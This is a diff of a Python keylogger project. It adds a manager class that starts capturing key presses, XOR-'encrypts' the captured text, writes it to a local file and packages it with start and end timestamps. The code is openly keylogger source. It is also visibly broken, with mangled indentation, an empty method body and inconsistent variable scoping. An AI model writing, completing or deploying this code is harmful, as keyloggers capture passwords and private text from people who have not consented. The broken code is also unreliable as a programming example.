@@ -48,11 +48,9 @@ a.encryption_using_xor(b,4)
 
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
-        from datetime import datetime
-        import queue
+    
         self.listener = None
         super().__init__()
-        self.buf = queue.Queue()
     def start_logging(self):
         def on_press(key):
             global text
@@ -88,11 +86,11 @@ class KeyLoggerService(IKeyLogger):
 class FileWriter(IWriter):
     def __init__(self):
         super().__init__()
-        Encryption = Encryptor()
-        def send_data(self, data: str, machine_name: str):
+        self.Encryption = Encryptor()
+    def send_data(self, data: str, machine_name: str):
             for i in data:
-                text += Encryption.encryption_using_xor(i)
-        with open('text.txt','a') as file:
+                text += self.Encryption.encryption_using_xor(i)
+    with open('text.txt','a') as file:
             file.write(text)
 
                      
@@ -101,3 +99,20 @@ class FileWriter(IWriter):
 
 # b = FileWriter()
 # b.send_data()
+class KeyLoggerManager(FileWriter,KeyLoggerService):
+    def __init__(self):
+        super().__init__()
+
+    def start(self):
+            from datetime import datetime
+            import time
+            start_time = datetime.now()
+            a = Encryptor()
+            self.start_logging()
+            while len(self.text) >= 1000:
+                end_time = datetime.now()
+                a.encryption_using_xor(self.text)
+                jeson = {'start time':start_time,'data':self.text,'end time':end_time}
+                
+c = KeyLoggerManager()
+c.start()
